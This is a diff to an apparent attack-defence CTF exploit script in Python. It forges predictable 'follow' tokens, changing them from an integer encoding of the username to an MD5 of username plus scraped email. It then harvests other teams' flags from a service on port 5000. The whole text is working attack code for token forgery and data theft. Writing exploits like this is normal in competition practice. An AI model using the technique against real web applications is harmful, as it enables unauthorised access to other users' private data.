@@ -5,6 +5,7 @@ import requests
 from requests.auth import HTTPBasicAuth
 import json
 import time
+from hashlib import md5
 import re
 import sys
  
@@ -20,11 +21,17 @@ with requests.Session() as s:
     
     p = s.post('http://{}:5000/search'.format(ip), data = 'csrf_token={}&order=date_created&search='.format(csrf[0]).encode('UTF-8'), headers = headers)
     users = re.findall('<form action="/follow/(.*)" method="post">', p.text)
-    csrf = re.findall('name="csrf_token" type="hidden" value="(.*)"', p.text)
     #
     for user in users:
-       req = 'csrf_token={}&token={}'.format(csrf[0], int.from_bytes(user.encode(), byteorder='big'))
+       p = s.get('http://{}:5000/user/{}'.format(ip, user))
+       emails = re.findall('<p>(.*@.*\..*)</p>', p.text)
+       data = user + emails[0]
+       token = md5(data.encode('utf-8')).hexdigest()
+       req = 'csrf_token={}&token={}'.format(csrf[0], token)
        p = s.post('http://{}:5000/follow/{}'.format(ip, user), data = req.encode('UTF-8'), headers = headers)
+       
+       if "You are following" not in p.text:
+           continue
        posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
        print(posts) # Получили все флаги, хранящиеся в открытом виде
        
